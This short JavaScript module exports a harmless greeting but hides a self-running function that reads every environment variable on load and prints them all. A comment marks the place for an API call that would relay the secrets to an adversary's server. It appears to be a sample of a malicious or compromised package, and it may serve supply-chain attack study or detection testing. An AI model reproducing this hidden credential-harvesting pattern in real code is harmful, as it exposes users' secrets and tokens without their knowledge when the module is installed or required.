(() => {

    const envList = [];
    
    Object.entries(process.env).forEach(([key, value]) => {
      envList.push(`${key}=${value}`)
    })
    console.log('Updated Environment Variables List:', envList)

    // * API call that relays secrets to adversaries server *
})()


module.exports = { greetings: "Hello from app-module!" };